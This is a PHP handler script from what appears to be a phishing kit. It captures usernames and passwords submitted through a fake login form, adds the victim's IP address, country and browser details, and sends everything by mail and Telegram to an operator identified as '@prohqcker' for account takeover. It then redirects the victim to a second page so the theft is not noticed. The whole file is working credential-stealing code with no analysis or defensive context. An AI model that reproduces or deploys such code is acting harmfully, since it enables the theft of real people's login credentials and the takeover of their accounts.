<?php
require("config.php");
include('me.php');
   $country = visitor_country();
   $ip = getenv("REMOTE_ADDR");
$Port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$subject = "Telegram ID: @prohqcker**";
$message = "**Telegram ID: @prohqcker *ATO***+++\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "User-!P : ".$ip."\n";
$message .= "Country : ".$country."\n\n";
$message .= "----------------------------------------\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$headers = "From: Prohqcker";
@mail($send,$subject,$message,$headers);
send_telegram_msg($message);
header("location:index2.html");

  
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>

